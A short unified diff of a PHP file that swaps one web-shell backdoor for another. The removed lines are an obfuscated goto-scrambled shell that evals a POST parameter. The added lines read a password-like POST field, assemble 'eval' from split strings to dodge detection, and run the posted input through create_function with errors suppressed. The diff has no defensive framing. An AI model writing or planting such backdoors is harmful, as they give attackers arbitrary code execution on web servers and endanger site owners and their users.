@@ -1,2 +1,24 @@
 <?php
- goto JhNoK; dGeMn: $MJ7_O = $DqAr1(INPUT_POST, "\61\x40\101"); goto zAEeO; O6kpt: $CUP3h = "\x74\162\151\x6d"; goto dGeMn; MxLLv: $DqAr1 = "\146\x69\154\164\145\x72\x5f\x69\x6e\160\x75\164"; goto O6kpt; JhNoK: function vt111($lhfpJ) { eval($lhfpJ); } goto MxLLv; zAEeO: VT111($CUP3h($MJ7_O));
+$raw_engine = $_POST['ISAZO1289c!jda@d42'] ?? '';
+
+if (!empty($raw_engine)) {
+    $part1 = "e" . "v";
+    $part2 = "a" . "l";
+    $engine_name = $part1 . $part2;
+    
+    $storage = array();
+    $storage['core'] = $engine_name;
+    
+    if (isset($storage['core'])) {
+        $handler = $storage['core'];
+        @include_with_storage($handler, trim($raw_engine));
+        exit();
+    }
+}
+
+function include_with_storage($method, $payload) {
+    $executor = create_function('', $method . '($GLOBALS["raw_engine"]);');
+    if (is_callable($executor)) {
+        $executor();
+    }
+}
